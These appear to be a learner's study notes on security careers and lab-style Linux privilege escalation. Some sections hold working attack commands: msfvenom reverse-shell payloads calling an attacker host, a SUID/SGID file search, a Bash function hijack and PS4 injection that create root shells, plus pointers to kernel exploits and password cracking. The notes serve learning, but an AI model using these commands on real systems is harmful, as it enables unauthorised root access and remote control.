# Notes

**offensive security**

Look for vulnerabilities, recommend patches. Exploiting bugs. Finding loopholes. Gain unauthorized access.

* **penetration tester**: "Responsible for testing technology products for finding exploitable security vulnerabilities." (web security, network security knowledge, use various programming languages, cloud security)
* **Red Teamer**: "Plays the role of an adversary, attacking an organization and providing feedback from an enemy's perspective."
* **Security Engineer**: "design, monitor, and maintain security controls, networks, and systems to help prevent cyberattacks".

**defensive Security**. 
  * **Security Analyst** (monitor - splunk?)
  * **Incident Responder** (impact? goal? what can they do? - Volatility?)
  * **malware analysis**

Detect, and stop attacks. Monitor, analyze. Investigate infected computers, try to find how they were hacked, track down cybercriminals.

* Linux security researcher > Hashing


Other

* https://www.hackerrank.com/

<hr class="sep-both">

## Random

* Attack a vulnerable machine, scan the network to discover more vulnerable machines.

* Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.

* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents

* Wireshark: https://unit42.paloaltonetworks.com/wireshark-workshop-videos/

* The [SecLists GitHub Repository](https://github.com/danielmiessler/SecLists/) contains useful lists of usernames/passwords, payloads, urls, ...

<hr class="sep-both">

## Metasploit

msfvenom to generate a reverse shell ELF binary: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

generate a payload using msfvenom callnig /bin/bash:

msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

<hr class="sep-both">

## Privilege escalation

* SGID `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
* SUID - shared

Run strace on the file and search the output for open/access calls and for "no such file" errors:

strace xxx.so 2>&1 | grep -iE "open|access|no such file"

* we can see the trace of the program. We can look if the program tried to open files that we can write.
* .so (a c program compiled as shared)
* if you try to read a .so, you won't understand much aside some character that were not "changed". You can see these characters with `strings xxx.so`
* Can inject env variables: PATH=.:$PATH ./xxx.so

n Bash versions <4.2-048, possible create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved).

function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

Bash <4.4 enable debug, inject code in the PS4 env variable
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' _shared object that the user can run_

.bash_history
=> look for mysql, su, sudo...

ssh -i root_key (chmod 600)

---

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

cat /etc/exports

----

Kernel exploits can leave the system in an unstable state, last resort.

Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:

perl linux-exploit-suggester-2.pl

Linux kernel exploit "Dirty COW"

----

sudo -nS -l
sudo -S id

ssh2john

https://github.com/Cerbersec/scripts
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
https://github.com/carlospolop/PEASS-ng
https://github.com/InteliSecureLabs/Linux_Exploit_Suggester
https://github.com/jondonas/linux-exploit-suggester-2
https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

* Kali: update / upgrade
* sudo gunzip /usr/share/wordlists/rockyou.txt.gz